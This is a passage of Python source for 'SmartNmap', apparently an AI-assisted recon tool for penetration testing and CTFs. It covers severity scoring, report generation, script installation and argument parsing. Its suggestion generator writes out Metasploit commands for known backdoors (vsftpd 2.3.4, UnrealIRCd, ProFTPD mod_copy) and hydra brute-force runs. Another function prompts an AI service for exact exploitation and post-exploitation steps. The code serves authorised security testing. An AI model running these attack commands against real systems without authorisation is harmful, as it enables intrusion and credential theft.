                "Any credentials found? Writable shares? Interesting web directories? "
                "What should I try next?")
            if advice:
                print(f"\n{C.M}  AI Tool Analysis:{C.Re}")
                for line in advice.strip().split('\n'):
                    print(f"  {C.Di}{line}{C.Re}")

    return shellshock_vulns


SEVERITY_ORDER = {'critical': 0, 'high': 1, 'medium': 2, 'low': 3, 'info': 4, '': 5}


def guess_severity(desc, cve=''):
    """Heuristic severity from description / CVE. Honors embedded CVSS scores."""
    s = (desc + ' ' + cve).lower()
    # Honor explicit CVSS score if mentioned (e.g. "CVSS 9.8" from vulners)
    cvss_match = re.search(r'cvss\s*[:=]?\s*(\d+\.\d+)', s)
    if cvss_match:
        try:
            cvss = float(cvss_match.group(1))
            if cvss >= 9.0:
                return 'critical'
            if cvss >= 7.0:
                return 'high'
            if cvss >= 4.0:
                return 'medium'
            if cvss > 0:
                return 'low'
        except ValueError:
            pass
    # Famous critical CVEs / exploit codenames
    critical_cves = ['ms17-010', 'ms08-067', 'ms12-020', 'ms14-068',
                     'cve-2014-6271', 'cve-2017-0144', 'cve-2017-0143',
                     'cve-2019-0708', 'cve-2020-0796', 'cve-2021-44228',
                     'cve-2021-26855', 'cve-2021-34527', 'cve-2022-22965',
                     'cve-2014-0160', 'cve-2018-7600', 'cve-2019-19781']
    if any(k in s for k in critical_cves):
        return 'critical'
    if any(k in s for k in ['rce', 'remote code', 'eternalblue', 'heartbleed',
                             'shellshock', 'bluekeep', 'log4shell', 'proxyshell',
                             'proxylogon', 'backdoor', 'unauthenticated',
                             'drupalgeddon', 'deserialization', 'ognl',
                             'spring4shell', 'smbghost', 'zerologon',
                             'printnightmare', 'dirty pipe']):
        return 'critical'
    if any(k in s for k in ['auth bypass', 'sql injection', 'path traversal',
                             'directory traversal', 'xxe', 'file read',
                             'arbitrary file', 'lfi', 'rfi', 'smbv1',
                             'anonymous', 'null session', 'null bind',
                             'ssrf', 'command injection']):
        return 'high'
    if any(k in s for k in ['xss', 'csrf', 'weak', 'deprecated', 'info disclosure',
                             'information disclosure', 'enum', 'expired cert',
                             'weak cipher', 'poodle', 'beast', 'crime',
                             'username enumeration']):
        return 'medium'
    if any(k in s for k in ['missing', 'default', 'self-signed', 'debug',
                             'banner', 'version disclosure']):
        return 'low'
    return 'info'


def phase6_analysis(target, services, vulns, outdir, args, api_key=None, loot=None, os_info=None,
                     sploit_results=None, puter_token=None, hostnames=None):
    """Phase 6: Deep Analysis, CTF Guidance & Report."""
    section("PHASE 6: Deep Analysis & Report Generation")
    hostnames = hostnames or []

    # Enrich vulns with severity, deduplicate by (port, cve, desc-prefix), sort
    for v in vulns:
        if 'severity' not in v:
            v['severity'] = guess_severity(v.get('desc', ''), v.get('cve', ''))
    seen = set()
    deduped = []
    for v in vulns:
        key = (v.get('port', 0),
               (v.get('cve') or '').upper().strip(),
               (v.get('desc') or '')[:40].lower().strip())
        if key in seen:
            continue
        seen.add(key)
        deduped.append(v)
    vulns = deduped
    vulns_sorted = sorted(vulns, key=lambda v: SEVERITY_ORDER.get(v.get('severity', ''), 5))

    # Build comprehensive summary
    summary_lines = [f"Target: {target}", f"Date: {datetime.datetime.now().isoformat()}", ""]

    if os_info:
        summary_lines.append(f"OS: {os_info[0].get('name','Unknown')}")
        summary_lines.append("")

    if hostnames:
        summary_lines.append("=== HOSTNAMES ===")
        for h in hostnames:
            summary_lines.append(f"  - {h}")
        summary_lines.append("")

    summary_lines.append("=== SERVICES ===")
    for port in sorted(services.keys()):
        svc = services[port]
        ver = f"{svc.get('product','')} {svc.get('version','')}".strip()
        summary_lines.append(f"  {port}/{svc.get('proto','tcp')}: {svc.get('service','')} - {ver}")

    if vulns_sorted:
        summary_lines.append("\n=== KNOWN VULNERABILITIES (sorted by severity) ===")
        for v in vulns_sorted:
            sev = v.get('severity', '').upper()
            summary_lines.append(f"  [{sev:<8}] Port {v['port']}: {v['desc']} ({v['cve']})")
            summary_lines.append(f"              Exploit: {v['exploit']}")

    # Collect all script outputs
    all_scripts = {}
    for xml_file in outdir.glob('*.xml'):
        try:
            parsed = parse_xml(xml_file)
            for p, svc in parsed.get('services', {}).items():
                for sid, sout in svc.get('scripts', {}).items():
                    if sout.strip():
                        all_scripts[f"{p}/{sid}"] = sout[:500]
        except Exception:
            pass

    if all_scripts:
        summary_lines.append("\n=== NOTABLE SCRIPT OUTPUTS ===")
        for k, v in list(all_scripts.items())[:30]:
            summary_lines.append(f"  [{k}]: {v[:200]}")

    # Collect tool outputs
    tool_outputs = {}
    for f in outdir.iterdir():
        if f.suffix == '.txt' and 'phase' not in f.name and f.stat().st_size > 0:
            try:
                tool_outputs[f.name] = f.read_text()[:500]
            except Exception:
                pass

    if tool_outputs:
        summary_lines.append("\n=== TOOL OUTPUTS ===")
        for name, content in tool_outputs.items():
            summary_lines.append(f"  [{name}]: {content[:200]}")

    if sploit_results:
        summary_lines.append("\n=== SEARCHSPLOIT RESULTS ===")
        for query, results in sploit_results.items():
            summary_lines.append(f"  Query: {query} ({len(results)} results)")
            for r in results[:5]:
                edb_id = r.get('EDB-ID', '')
                title = r.get('Title', '')
                summary_lines.append(f"    [EDB-{edb_id}] {title}")

    summary = '\n'.join(summary_lines)

    subsection("Suggested Follow-up Commands")
    suggestions = generate_suggestions(target, services, vulns_sorted)
    for s in suggestions:
        print(f"    {C.Cy}{s}{C.Re}")

    # AI Deep Analysis
    ai_response = None
    if api_key or puter_token or os.environ.get('PUTER_AUTH_TOKEN'):
        subsection("AI Attack Path Synthesis")
        mode = "CTF challenge" if args.ctf else "bug bounty" if args.bb else "penetration test"
        prompt = f"""You are an elite penetration tester conducting a {mode}.
Analyze ALL the following reconnaissance data and provide a comprehensive attack plan.

{summary}

Provide:
1. **EXECUTIVE SUMMARY** - 3 bullet points on the target's attack surface
2. **CRITICAL FINDINGS** - Most dangerous findings ranked by exploitability
3. **PRIMARY ATTACK PATH** - Step-by-step initial foothold strategy with exact commands
4. **QUICK WINS** - Things to try right now (sorted by likelihood of success)
5. **EXPLOITATION COMMANDS** - Exact metasploit/manual exploit commands for each finding
6. **POST-EXPLOITATION** - What to do after gaining access (privesc, lateral movement, loot)
7. **ADDITIONAL RECON** - What else to enumerate that we may have missed"""

        if args.ctf:
            prompt += """
8. **CTF-SPECIFIC** - Common CTF flag locations, hints from service versions, likely challenge path
   Look for: user.txt, root.txt, interesting files in NFS/SMB shares, SSH keys, backup files"""

        ai_response = query_ai(prompt, api_key=api_key, puter_token=puter_token, timeout=120)
        if ai_response:
            provider = "GEMINI + QWEN" if (api_key and (puter_token or os.environ.get('PUTER_AUTH_TOKEN'))) else "AI"
            print(f"\n{C.M}{C.Bo}{'='*70}{C.Re}")
            print(f"{C.M}{C.Bo}  {provider} - ATTACK PATH ANALYSIS{C.Re}")
            print(f"{C.M}{C.Bo}{'='*70}{C.Re}\n")
            print(ai_response)
            (outdir / 'ai_attack_path.md').write_text(
                f"# AI Attack Path Analysis - {target}\n\n{ai_response}")
            good(f"AI analysis saved to: {outdir / 'ai_attack_path.md'}")

    # Write text report
    report = outdir / 'report.txt'
    report_lines = [
        f"SmartNmap v{VERSION} Reconnaissance Report",
        f"{'='*50}",
        summary, "",
        "=== SUGGESTED COMMANDS ===",
    ] + [f"  {s}" for s in suggestions]
    report.write_text('\n'.join(report_lines))
    good(f"Report saved to: {report}")

    # Markdown report
    if getattr(args, 'markdown', True):
        md = write_markdown_report(target, services, vulns_sorted, all_scripts,
                                    sploit_results, os_info, hostnames,
                                    suggestions, ai_response, loot, outdir)
        good(f"Markdown report: {md}")

    # Loot report
    if loot:
        loot.write(outdir / 'loot.md')
        good(f"Loot tracker saved to: {outdir / 'loot.md'}")

    # JSON export
    if args.json:
        json_data = {
            'smartnmap_version': VERSION,
            'target': target,
            'hostnames': hostnames,
            'timestamp': datetime.datetime.now().isoformat(),
            'os': os_info,
            'services': {str(k): v for k, v in services.items()},
            'vulnerabilities': vulns_sorted,
            'scripts': all_scripts,
            'searchsploit': {q: [{'EDB-ID': r.get('EDB-ID', ''), 'Title': r.get('Title', '')}
                                 for r in results]
                             for q, results in (sploit_results or {}).items()},
            'suggestions': suggestions,
            'ai_analysis': ai_response or '',
        }
        json_file = outdir / 'results.json'
        json_file.write_text(json.dumps(json_data, indent=2, default=str))
        good(f"JSON export: {json_file}")


def write_markdown_report(target, services, vulns, all_scripts, sploit_results,
                          os_info, hostnames, suggestions, ai_response, loot, outdir):
    """Write a detailed Markdown report."""
    md_file = outdir / 'REPORT.md'
    lines = [
        f"# SmartNmap Reconnaissance Report",
        f"",
        f"**Target:** `{target}`  ",
        f"**Date:** {datetime.datetime.now().isoformat()}  ",
        f"**Tool:** SmartNmap v{VERSION}",
        f"",
        f"## Executive Summary",
        f"",
        f"- **Open Ports:** {len(services)}",
        f"- **Services Identified:** {len([s for s in services.values() if s.get('service')])}",
        f"- **Known Vulnerabilities:** {len(vulns)}",
    ]
    # Severity breakdown
    sev_counts = {}
    for v in vulns:
        sev_counts[v.get('severity', 'info')] = sev_counts.get(v.get('severity', 'info'), 0) + 1
    if sev_counts:
        lines.append(f"- **Severity Breakdown:** " +
                     ', '.join(f"{sev_counts[s]} {s}" for s in ('critical', 'high', 'medium', 'low', 'info') if sev_counts.get(s)))

    if os_info:
        lines.append(f"- **OS:** {os_info[0].get('name', 'Unknown')} ({os_info[0].get('accuracy', '?')}%)")
    if hostnames:
        lines.append(f"- **Hostnames:** " + ', '.join(f"`{h}`" for h in hostnames[:10]))

    lines.extend(['', '## Services', ''])
    lines.append("| Port | Proto | Service | Product | Version | Extras |")
    lines.append("|------|-------|---------|---------|---------|--------|")
    for port in sorted(services.keys()):
        s = services[port]
        lines.append(f"| {port} | {s.get('proto', 'tcp')} | {s.get('service', '')} | "
                     f"{s.get('product', '')} | {s.get('version', '')} | {s.get('extra', '')} |")

    if vulns:
        lines.extend(['', '## Vulnerabilities', ''])
        for v in vulns:
            sev = v.get('severity', 'info').upper()
            lines.append(f"### [{sev}] Port {v['port']}: {v['desc']}")
            if v.get('cve'):
                lines.append(f"- **CVE:** `{v['cve']}`")
            if v.get('product') or v.get('version'):
                lines.append(f"- **Product:** {v.get('product', '')} {v.get('version', '')}")
            if v.get('exploit'):
                lines.append(f"- **Exploit:** `{v['exploit']}`")
            lines.append('')

    if sploit_results:
        lines.extend(['', '## Exploit Database', ''])
        for query, results in sploit_results.items():
            lines.append(f"### Query: `{query}` ({len(results)} results)")
            for r in results[:10]:
                edb_id = r.get('EDB-ID', '')
                title = r.get('Title', '')
                path = r.get('Path', '')
                lines.append(f"- **[EDB-{edb_id}]** {title}")
                if path:
                    lines.append(f"  - Path: `{path}`")
            lines.append('')

    if all_scripts:
        lines.extend(['', '## Notable NSE Script Outputs', ''])
        for k, v in list(all_scripts.items())[:30]:
            lines.append(f"### `{k}`")
            lines.append('```')
            lines.append(v[:1000])
            lines.append('```')
            lines.append('')

    # Loot
    if loot:
        loot_categories = ['creds', 'keys', 'flags', 'shares', 'urls', 'files', 'notes']
        has_loot = any(getattr(loot, cat, []) for cat in loot_categories)
        if has_loot:
            lines.extend(['', '## Loot', ''])
            for cat in loot_categories:
                items = getattr(loot, cat, [])
                if items:
                    lines.append(f"### {cat.title()}")
                    for item in sorted(set(items))[:50]:
                        lines.append(f"- `{item}`")
                    lines.append('')

    if suggestions:
        lines.extend(['', '## Suggested Follow-up Commands', '', '```bash'])
        for s in suggestions:
            lines.append(s)
        lines.append('```')

    if ai_response:
        lines.extend(['', '## AI Attack Path Analysis', '', ai_response])

    md_file.write_text('\n'.join(lines))
    return md_file


def generate_suggestions(target, services, vulns):
    """Generate follow-up command suggestions based on findings."""
    cmds = []
    for port, svc in sorted(services.items()):
        service = svc.get('service', '').lower()
        product = svc.get('product', '').lower()
        version = svc.get('version', '')

        if 'ftp' in service:
            cmds.append(f"# FTP ({port})")
            cmds.append(f"ftp {target} {port}   # Try anonymous login")
            if 'proftpd' in product and '1.3.5' in version:
                cmds.append(f"# ProFTPD 1.3.5 mod_copy: SITE CPFR / SITE CPTO")
                cmds.append(f"msfconsole -x 'use exploit/unix/ftp/proftpd_modcopy_exec; set RHOSTS {target}; run'")
            if 'vsftpd' in product and '2.3.4' in version:
                cmds.append(f"msfconsole -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {target}; run'")

        elif 'ssh' in service:
            cmds.append(f"# SSH ({port})")
            cmds.append(f"ssh {target} -p {port}")
            cmds.append(f"hydra -L users.txt -P passwords.txt ssh://{target}:{port}")

        elif any(x in service for x in ['http', 'www']) or port in [80, 443, 8080, 8443]:
            scheme = 'https' if port in [443, 8443] or svc.get('tunnel') == 'ssl' else 'http'
            cmds.append(f"# HTTP ({port})")
            cmds.append(f"curl -v {scheme}://{target}:{port}/")
            cmds.append(f"gobuster dir -u {scheme}://{target}:{port}/ -w /usr/share/wordlists/dirb/common.txt")
            cmds.append(f"nikto -h {scheme}://{target}:{port}/")
            if 'wordpress' in product:
                cmds.append(f"wpscan --url {scheme}://{target}:{port}/ --enumerate ap,at,u")

        elif any(x in service for x in ['netbios', 'smb', 'microsoft-ds']):
            cmds.append(f"# SMB ({port})")
            cmds.append(f"smbclient -L //{target} -N")
            cmds.append(f"smbmap -H {target}")
            cmds.append(f"enum4linux -A {target}")
            cmds.append(f"crackmapexec smb {target} --shares")

        elif any(x in service for x in ['nfs', 'rpcbind', 'mountd', 'nfs_acl']):
            cmds.append(f"# NFS/RPC ({port})")
            cmds.append(f"showmount -e {target}")
            cmds.append(f"mkdir /tmp/nfs && mount -t nfs {target}:/SHARE /tmp/nfs")

        elif 'mysql' in service:
            cmds.append(f"# MySQL ({port})")
            cmds.append(f"mysql -h {target} -P {port} -u root")

        elif 'rdp' in service or 'ms-wbt' in service:
            cmds.append(f"# RDP ({port})")
            cmds.append(f"xfreerdp /v:{target}:{port} /u:administrator")
            cmds.append(f"hydra -L users.txt -P passwords.txt rdp://{target}")

        elif 'redis' in service:
            cmds.append(f"# Redis ({port})")
            cmds.append(f"redis-cli -h {target} -p {port} INFO")

        elif 'irc' in service:
            cmds.append(f"# IRC ({port})")
            if 'unrealircd' in product:
                cmds.append(f"msfconsole -x 'use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOSTS {target}; run'")

    # Vuln-specific commands
    for v in vulns:
        if v['exploit'] and v['exploit'] not in '\n'.join(cmds):
            cmds.append(f"# {v['desc']}")
            cmds.append(f"{v['exploit']}")

    return cmds

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# INSTALL SCRIPTS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def install_scripts():
    """Install/update extra NSE scripts from GitHub."""
    section("NSE Script Installer")
    nse_dir = find_nse_dir()
    info(f"NSE directory: {nse_dir}")

    scripts_to_install = [
        {
            'name': 'vulners.nse',
            'url': 'https://raw.githubusercontent.com/vulnersCom/nmap-vulners/master/vulners.nse',
            'check': nse_dir / 'vulners.nse',
        },
        {
            'name': 'vulscan (git clone)',
            'url': 'https://github.com/scipag/vulscan.git',
            'check': nse_dir / 'vulscan' / 'vulscan.nse',
            'git': True,
            'dest': nse_dir / 'vulscan',
        },
        {
            'name': 'nmap-nse-vulnerability-scripts (git clone)',
            'url': 'https://github.com/nccgroup/nmap-nse-vulnerability-scripts.git',
            'check': nse_dir / 'nccgroup-vuln',
            'git': True,
            'dest': nse_dir / 'nccgroup-vuln',
        },
    ]

    single_scripts = [
        ('freevulnsearch.nse',
         'https://raw.githubusercontent.com/OCSAF/freevulnsearch/master/freevulnsearch.nse'),
        ('nmap-log4shell.nse',
         'https://raw.githubusercontent.com/giterlizzi/nmap-log4shell/main/log4shell.nse'),
        ('http-spring4shell.nse',
         'https://raw.githubusercontent.com/gpiechnik2/nmap-spring4shell/main/http-spring4shell.nse'),
    ]

    for s in scripts_to_install:
        if s['check'].exists():
            good(f"{s['name']}: already installed")
        else:
            if s.get('git'):
                warn(f"{s['name']}: not installed")
                info(f"  Install: git clone {s['url']} {s.get('dest', '')}")
                try:
                    subprocess.run(['git', 'clone', s['url'], str(s['dest'])],
                                   capture_output=True, timeout=60)
                    if s['check'].exists():
                        good(f"  Installed {s['name']}")
                    else:
                        error(f"  Failed to install {s['name']}")
                except Exception as e:
                    error(f"  git clone failed: {e}")
                    info(f"  Manual: git clone {s['url']} {s.get('dest','')}")
            else:
                warn(f"{s['name']}: not installed")
                try:
                    info(f"  Downloading {s['name']}...")
                    req = Request(s['url'])
                    with urlopen(req, timeout=15) as r:
                        content = r.read()
                    dest = nse_dir / s['name']
                    dest.write_bytes(content)
                    good(f"  Installed {s['name']}")
                except Exception as e:
                    error(f"  Download failed: {e}")
                    info(f"  Manual: curl -o {nse_dir}/{s['name']} {s['url']}")

    for name, url in single_scripts:
        dest = nse_dir / name
        if dest.exists():
            good(f"{name}: already installed")
        else:
            try:
                info(f"Downloading {name}...")
                req = Request(url)
                with urlopen(req, timeout=15) as r:
                    content = r.read()
                dest.write_bytes(content)
                good(f"Installed {name}")
            except Exception as e:
                warn(f"Could not download {name}: {e}")
                info(f"  Manual: curl -o {nse_dir}/{name} {url}")

    # Update script db
    info("Updating nmap script database...")
    try:
        subprocess.run(['nmap', '--script-updatedb'], capture_output=True, timeout=30)
        good("Script database updated")
    except Exception:
        warn("Could not update script database - run: nmap --script-updatedb")

    # Also suggest tools to install
    subsection("Recommended Tools")
    tool_installs = {
        'nikto': 'apt install nikto',
        'gobuster': 'apt install gobuster',
        'enum4linux': 'apt install enum4linux',
        'smbclient': 'apt install smbclient',
        'smbmap': 'pip3 install smbmap',
        'showmount': 'apt install nfs-common',
        'whatweb': 'apt install whatweb',
        'wpscan': 'gem install wpscan',
        'hydra': 'apt install hydra',
        'nuclei': 'go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest',
        'ffuf': 'apt install ffuf',
        'searchsploit': 'apt install exploitdb',
    }
    tools = check_tools()
    for tool, cmd in tool_installs.items():
        if tools.get(tool):
            good(f"{tool}: installed")
        else:
            warn(f"{tool}: NOT installed  =>  {cmd}")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# ARGUMENT PARSING
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def parse_args():
    p = argparse.ArgumentParser(
        description=f'SmartNmap v{VERSION} - AI-Driven Intelligent Nmap Reconnaissance',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s 10.0.0.1                       # Standard scan (top 1000 ports)
  %(prog)s 10.0.0.1 --full                # Full port scan (-p-)
  %(prog)s 10.0.0.1 --ctf -ai             # CTF mode with AI analysis
  %(prog)s target.com --bb -ai            # Bug bounty mode (safer timing)
  %(prog)s 10.0.0.1 --ports 21,22,80,445  # Skip port discovery
  %(prog)s 10.0.0.1 --fast                # Use rustscan/masscan for speed
  %(prog)s 10.0.0.1 --vhosts               # Enable vhost enumeration
  %(prog)s --install-scripts              # Install extra NSE scripts

Setup:
  - Set GEMINI_API_KEY env var for AI, or put key in ~/.config/smartnmap/config.json
  - Run `./install.sh` to install NSE scripts and recommended tools
        """)

    p.add_argument('target', nargs='?', help='Target IP, CIDR or hostname')

    scan = p.add_argument_group('Scanning')
    scan.add_argument('--full', action='store_true', help='Full port scan (-p-, 1-65535)')
    scan.add_argument('--quick', action='store_true', help='Quick scan (top 1000 ports, default)')
    scan.add_argument('--fast', action='store_true',
                      help='Use masscan/rustscan for ultra-fast port discovery (if installed)')
    scan.add_argument('--top-ports', type=int, default=0, help='Scan top N ports')
    scan.add_argument('--ports', help='Comma-separated ports (skip phase 1)')
    scan.add_argument('-t', '--timing', default='T4', choices=['T1','T2','T3','T4','T5'],
                      help='Nmap timing template (default: T4)')
    scan.add_argument('--stealth', action='store_true', help='Stealth mode (T2, slower)')
    scan.add_argument('--udp', action='store_true', help='Include UDP scan')
    scan.add_argument('--no-retry', action='store_true', help='Disable fallback port probe')
    scan.add_argument('-6', '--ipv6', dest='ipv6', action='store_true', help='Scan via IPv6 (-6)')
    scan.add_argument('--source-port', type=int, help='Use source port (-g)')
    scan.add_argument('--decoys', help='Use nmap decoys (-D) e.g. RND:10 or ip1,ip2')

    ai = p.add_argument_group('AI')
    ai.add_argument('-ai', '--ai', action='store_true',
                    help='Enable AI analysis (requires GEMINI_API_KEY or Puter token)')
    ai.add_argument('--api-key', default=os.environ.get('GEMINI_API_KEY', GEMINI_DEFAULT_KEY),
                    help='Gemini API key (default: from env/config)')
    ai.add_argument('--puter-token', default=os.environ.get('PUTER_AUTH_TOKEN', ''),
                    help='Puter auth token for Qwen AI fallback')
    ai.add_argument('--puter-model', default='qwen/qwen3.6-plus',
                    help='Puter/Qwen model (default: qwen/qwen3.6-plus)')

    mode = p.add_argument_group('Mode')
    mode.add_argument('--ctf', action='store_true', help='CTF mode (aggressive, flag hunting)')
    mode.add_argument('--bb', action='store_true', help='Bug bounty mode (safer scans)')

    web = p.add_argument_group('Web / Vhost')
    web.add_argument('--vhosts', action='store_true',
                     help='Enable vhost/subdomain enumeration for HTTP services')
    web.add_argument('--hostname', help='Manual hostname to try for vhosts (sets Host: header)')
    web.add_argument('--vhost-wordlist', help='Wordlist for vhost/subdomain brute (ffuf)')
    web.add_argument('--update-hosts', action='store_true',
                     help='Append discovered hostnames to /etc/hosts (requires root)')

    output = p.add_argument_group('Output')
    output.add_argument('-o', '--output', help='Output directory')
    output.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    output.add_argument('--json', action='store_true', help='Export JSON summary')
    output.add_argument('--markdown', action='store_true', default=True,
                        help='Export Markdown report (default)')
    output.add_argument('--no-stream', action='store_true',
                        help='Disable live output streaming from nmap')

    mgmt = p.add_argument_group('Management')
    mgmt.add_argument('--install-scripts', action='store_true', help='Install extra NSE scripts')
    mgmt.add_argument('--no-vuln', action='store_true', help='Skip vulnerability scan (phase 4)')
    mgmt.add_argument('--no-extra', action='store_true', help='Skip supplementary tools (phase 5)')
    mgmt.add_argument('--no-nuclei', action='store_true', help='Skip nuclei scan')
    mgmt.add_argument('--no-gobuster', action='store_true', help='Skip gobuster/ffuf dir brute')
    mgmt.add_argument('--resume', action='store_true',
                      help='Resume previous scan (reuses existing XML files in --output dir)')
    mgmt.add_argument('--version', action='version', version=f'SmartNmap {VERSION}')

    args = p.parse_args()

    if args.install_scripts:
        return args

    if not args.target:
        p.error('target is required (unless using --install-scripts)')

    # Compute scan mode
    if args.full and args.quick:
        p.error('--full and --quick are mutually exclusive')
    if args.top_ports:
        args.full = False
        args.quick = False
    if args.no_stream:
        global VERBOSE_STREAM
        VERBOSE_STREAM = False

    if args.stealth:
        args.timing = 'T2'
    if args.bb and args.timing in ['T4', 'T5']:
        args.timing = 'T3'
    if args.ctf and not args.stealth:
        args.timing = 'T4'

    return args


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MAIN
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def expand_cidr_targets(target):
    """Expand CIDR/range to list of individual target IPs.
    Returns (is_range, list_of_targets).
    - Non-CIDR input: (False, [target])
    - Single /32 CIDR: (False, [ip])
    - Small CIDR (<=32 addresses, ie /27 or smaller): (True, [list of host IPs])
    - Larger CIDR: (True, [network_str]) – caller should run host discovery first.
    """
    try:
        net = ipaddress.ip_network(target, strict=False)
    except ValueError:
        return False, [target]
    if net.num_addresses == 1:
        return False, [str(net.network_address)]
    if net.num_addresses > 32:
        return True, [str(net)]
    if net.num_addresses > 2:
        hosts = [str(h) for h in net.hosts()]
    else:
        hosts = [str(net.network_address)]
    return True, hosts


def host_discovery_cidr(target, outdir, timeout=180):
    """Run nmap host discovery for a CIDR range. Returns list of alive IPs.
    Uses -Pn + fast TCP probe fallback for environments that block ICMP.
    """
    info(f"Host discovery in {target}...")
    xml = outdir / 'host_discovery.xml'
    rc, out = run_nmap(['-sn', '-n', '--min-rate', '500', target], xml,
                      'Host Discovery', timeout=timeout)
    parsed = parse_xml(xml)
    alive_hosts = parsed.get('alive_hosts', [])
    # Fallback: TCP probe against common ports (for ICMP-blocked environments)
    if not alive_hosts:
        info("ICMP ping-sweep found 0 hosts - trying TCP SYN probe on common ports")
        xml2 = outdir / 'host_discovery_tcp.xml'
        run_nmap(['-sn', '-Pn', '-PS21,22,80,443,3389,445,8080', '-n',
                  '--min-rate', '500', target],
                 xml2, 'Host Discovery TCP', timeout=timeout)
        alive_hosts = parse_xml(xml2).get('alive_hosts', [])
    return alive_hosts


def main():
    args = parse_args()
    banner()

    # Handle --install-scripts
    if args.install_scripts:
        install_scripts()
        return

    target = args.target
    api_key = args.api_key if args.ai else None
    puter_token = args.puter_token if args.ai else None
    if args.ai and args.puter_model:
        global _PUTER_MODEL
        _PUTER_MODEL = args.puter_model

    # Validate target
    if not is_valid_target(target):
        error(f"Invalid target: {target}")
        error("Expected: IP address (1.2.3.4), CIDR (1.2.3.0/24) or hostname")
        sys.exit(2)

    # CIDR / multi-target handling
    is_range, targets = expand_cidr_targets(target)
    if is_range:
        # For large ranges: do host discovery first, then scan alive hosts
        if len(targets) == 1 and '/' in targets[0]:
            network_str = targets[0]
            warn(f"Large CIDR {network_str} - running host discovery first")
            safe_target = re.sub(r'[/:]', '_', network_str)
            base = Path.home() / 'smartnmap_results'
            tmp_out = base / safe_target / datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
            tmp_out.mkdir(parents=True, exist_ok=True)
            alive = host_discovery_cidr(network_str, tmp_out)
            if not alive:
                error("No alive hosts found in range")
                return
            good(f"Found {len(alive)} alive host(s): {', '.join(alive[:20])}{'...' if len(alive) > 20 else ''}")
            (tmp_out / 'alive_hosts.txt').write_text('\n'.join(alive))
            if len(alive) > 50:
                warn(f"Too many hosts ({len(alive)}) - saving list only. Re-run per host.")
                info(f"Host list: {tmp_out}/alive_hosts.txt")
                return
            targets = alive

        if len(targets) > 1:
            info(f"Target is a range ({target}) - scanning {len(targets)} host(s) sequentially")
            section(f"Multi-target scan: {len(targets)} hosts")
            results_summary = []
            for idx, t in enumerate(targets, 1):
                info(f"[{idx}/{len(targets)}] Starting scan of {t}")
                sub_args = argparse.Namespace(**vars(args))
                sub_args.target = t
                try:
                    summary = _run_single_target(t, sub_args, api_key, puter_token)
                    if summary:
                        results_summary.append(summary)
                except SystemExit:
                    warn(f"Host {t} scan failed (SystemExit) - continuing")
                except KeyboardInterrupt:
                    warn("Interrupted - stopping multi-host scan")
                    break
                except Exception as e:
                    warn(f"Host {t}: {e}")
            if results_summary:
                section(f"Multi-Target Summary ({len(results_summary)} hosts scanned)")
                print(f"  {'Host':<18} {'Ports':<6} {'Services':<10} {'Vulns':<6}")
                for s in results_summary:
                    print(f"  {s.get('target','?'):<18} {s.get('ports',0):<6} {s.get('services',0):<10} {s.get('vulns',0):<6}")
            return
        elif len(targets) == 1:
            target = targets[0]
    _run_single_target(target, args, api_key, puter_token)


def _run_single_target(target, args, api_key, puter_token):
    """Run the full scan pipeline for a single target. Returns a summary dict."""
    # Resolve hostname if needed
    resolved_ip, input_hostname = resolve_target(target)
    if input_hostname:
        info(f"Resolved {C.Bo}{input_hostname}{C.Re} -> {C.Y}{resolved_ip}{C.Re}")

    timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')

    # Detect snap-confined nmap (cannot write outside $HOME/tmp)
    nmap_real = ''
    try:
        nmap_path = shutil.which('nmap') or ''
        nmap_real = os.path.realpath(nmap_path) if nmap_path else ''
    except Exception:
        pass
    snap_nmap = '/snap/' in nmap_real

    # Output directory (always use absolute path; prefer $HOME for snap-confined nmap)
    if args.output:
        outdir = Path(args.output).expanduser().resolve()
    else:
        safe_target = re.sub(r'[/:]', '_', target)
        base = Path.home() / 'smartnmap_results'
        outdir = (base / safe_target / timestamp).resolve()
    try:
        outdir.mkdir(parents=True, exist_ok=True)
    except PermissionError as e:
        error(f"Cannot create output directory {outdir}: {e}")
        sys.exit(1)

    # Check snap-nmap can write here: /snap nmap cannot write outside $HOME on many systems
    if snap_nmap:
        home = str(Path.home())
        od_str = str(outdir)
        if not (od_str.startswith(home) or od_str.startswith('/tmp/snap-private-tmp')):
            warn(f"Snap-confined nmap detected ({nmap_real}) - output path {outdir}")
            warn(f"Snap nmap cannot write outside $HOME. Moving output to ~/smartnmap_results/...")
            safe_target = re.sub(r'[/:]', '_', target)
            outdir = (Path.home() / 'smartnmap_results' / safe_target / timestamp).resolve()
            outdir.mkdir(parents=True, exist_ok=True)

    # Create 'latest' symlink for convenience
    parent = outdir.parent
    latest = parent / 'latest'
    try:
        if latest.is_symlink() or latest.exists():
            latest.unlink()
        latest.symlink_to(outdir.name)
    except (OSError, NotImplementedError):
        pass

    # Determine scan mode label
    if args.full:
        mode_label = 'Full -p-'
    elif args.top_ports:
        mode_label = f'Top-{args.top_ports}'
    else:
        mode_label = 'Quick (top 1000)'

    # Print config
    ai_providers = []
    if api_key:
        ai_providers.append('Gemini')
    if puter_token or os.environ.get('PUTER_AUTH_TOKEN'):
        ai_providers.append(f'Puter/Qwen ({_PUTER_MODEL})')
    ai_label = ' + '.join(ai_providers) if ai_providers else 'Disabled'

    info(f"Target:     {C.Bo}{C.Y}{target}{C.Re}")
    if input_hostname and resolved_ip != target:
